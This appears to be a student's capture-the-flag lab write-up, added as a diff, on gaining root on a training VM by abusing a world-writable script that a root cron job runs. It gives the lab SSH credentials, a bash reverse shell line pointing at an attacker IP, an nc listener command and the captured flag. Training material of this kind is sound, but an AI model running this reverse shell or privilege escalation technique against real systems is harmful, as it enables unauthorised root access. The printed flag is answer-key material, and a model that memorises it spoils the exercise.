@@ -1,0 +1,50 @@
+Questions 3
+Capstone Exercise: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.
+
+HINT
+Start by enumerating cronjobs using the techniques taught in Manual Enumeration - Listings 11 and 12.
+Once you have identified a suitable cronjob proceed to exploit it using the techniques taught in Abusing Cron Jobs learning unit.
+
+ssh student@192.168.155.52 -p2222
+Password: lab
+
+cat /var/log/cron.log 
+23:08:01 running the archiver
+23:09:01 running the archiver
+
+ls -lah /etc/cron*
+...
+/etc/cron.daily:
+-rwxr-xr-x 1 root root 1.5K Oct 21  2020 apt-compat
+-rwxr-xr-x 1 root root 1.1K Sep  3  2020 dpkg
+-rwxr-xr-x 1 root root 4.7K May  4  2021 exim4-base
+-rwxr-xr-x 1 root root 1.1K Jul  5  2020 man-db
+/etc/cron.hourly:
+-rw-r--r-- 1 root root  139 Dec  7  2021 archiver
+...
+
+cat /etc/cron.hourly/archiver
+I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
+/var/archives/archive.sh
+
+cat /var/archives/archive.sh                              
+#!/bin/bash
+
+TIMESTAMP=$(date +"%T")
+echo "$TIMESTAMP running the archiver"
+#cp -rf /home/kali/ /var/backups/kali/
+cp -rf /home/student/ /var/backups/student/
+
+ls -lah /var/archives/archive.sh 
+-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh
+
+# Is writeable! Lets paste the bash-revsh.sh
+exec bash -i &>/dev/tcp/192.168.45.237/6666 0>&1
+
+# On the attacker machine
+nc -lvnp 6666
+
+# Wait a minuite
+root@1691623454c9:~# cat flag.txt
+OS{88fb69cf4a1d0554600f399c4cf53258}
+
